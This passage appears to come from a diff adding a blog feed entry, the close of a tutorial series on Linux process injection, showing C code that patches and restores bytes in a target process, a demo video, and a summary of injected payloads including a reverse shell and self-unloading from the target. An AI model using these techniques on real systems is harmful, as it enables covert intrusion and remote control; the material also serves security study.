+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">apply_patch()</span>: Temporarily Writable Page, Then Copy
+  
+    <br><br>
+  
+</span>
+<p>The constructor finds the module, applies every table entry, and only starts the worker if at least one patch stuck. The thread itself just waits. On shutdown it walks the applied sites in reverse and writes <code>orig_bytes</code> back with the same helper:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">patch_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">payload_running</span>())
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_sleep_ms</span>(<span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> g_applied_count; i<span style="color:#f92672">--</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>; ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">apply_patch</span>(g_patch_sites[i], PATCHES[i].orig_bytes,
+</span></span><span style="display:flex;"><span>                        PATCHES[i].len) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">payload_log</span>(PATCH_LOG, <span style="color:#e6db74">&#34;patch[%zu] unpatched at %p (pid=%d)&#34;</span>,
+</span></span><span style="display:flex;"><span>                        i, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)g_patch_sites[i], <span style="color:#a6e22e">getpid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">payload_log</span>(PATCH_LOG, <span style="color:#e6db74">&#34;patch[%zu] unpatch failed at %p (pid=%d)&#34;</span>,
+</span></span><span style="display:flex;"><span>                        i, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)g_patch_sites[i], <span style="color:#a6e22e">getpid</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">patch_thread()</span>: Hold The Patches, Restore Originals on Shutdown
+  
+    <br><br>
+  
+</span>
+<p>Here&rsquo;s a quick demonstration:</p>
+<video width=100% controls>
+    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/patch.mp4" type="video/webm">
+    Your browser does not support the video tag.  
+</video>
+<link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="video">
+  Patch Demo
+  
+    <br><br>
+  
+</span>
+<h2 id="4-conclusion">4. Conclusion</h2>
+<p>The framework in <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.c</span> is small: a background thread so the target keeps running, a pipe so sleep can be interrupted, and two stop paths: normal exit through the destructor, or <code>SIGUSR2</code> through the wrapper.</p>
+<p>On top of that, the three examples do very different jobs with the same skeleton:</p>
+<ul>
+<li><strong>Reverse shell</strong> &ndash; connect back, spawn <span style="font-family: Courier, monospace; font-weight: 600;">/bin/sh</span>, reconnect if the session dies.</li>
+<li><strong>Beacon</strong> &ndash; a log heartbeat to confirm injection worked.</li>
+<li><strong>Patch</strong> &ndash; rewrite bytes at a module offset, restore them on the way out.</li>
+</ul>
+<p>A new payload is another thread function linked against the same helpers.</p>
+<p><code>SIGUSR2</code> is also the start of evacuation: the wrapper calls <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span> instead of returning. Part 6 covers how that trampoline removes the payload&rsquo;s own mapping from the target.</p>
+<h2 id="5-references">5. References</h2>
+<ol>
+<li><a href="https://github.com/mathscantor/linworm">mathscantor/linworm (GitHub)</a></li>
+</ol>
+]]></content>
+        </item>
         
         <item>
             <title>Step-by-Step Linux Process Injection Guide Part 4 - Loading the Library</title>
